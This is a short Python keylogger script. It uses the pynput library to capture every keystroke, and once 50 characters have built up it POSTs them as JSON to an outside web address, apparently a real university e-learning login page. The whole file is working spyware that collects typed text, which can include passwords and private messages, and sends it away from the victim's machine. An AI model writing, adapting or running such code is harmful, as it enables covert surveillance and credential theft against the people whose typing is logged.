import pynput.keyboard
import requests
import simplejson as json

log=""

def on_press(key):
    global log
    try:
        #convert key to a readable string
        if key==pynput.keyboard.Key.space:
            log+=" "
        elif key==pynput.keyboard.Key.enter:
            log+="\n"
        elif key==pynput.keyboard.Key.backspace:
            log+="[BACKSPACE]"
        else:
            #remove quotes from the key string
            log+=str(key).replace("'","")
            #send logs every 50 characters
        if len(log)>=50:
            data={"log":log}
            #send the log to the remote server
            response=requests.post("https://elearning.zetech.ac.ke/login/index.php", data=json.dumps(data),
                                   headers={"Content-Type":"application/json"})
            if response.status_code==200:
                print("Log sent successfully")
            else:
                print(f"Failed to send logs. Status code: {response.status_code}")
            log=""
    except Exception as e:
        print(f"Error:{e}")
def on_release(key):
    #stop listener on escape key(when ESC is pressed)
    if key==pynput.keyboard.Key.esc:
        print("Keylogger stopped")
        return False
#start the keylogger listener
listener=pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
            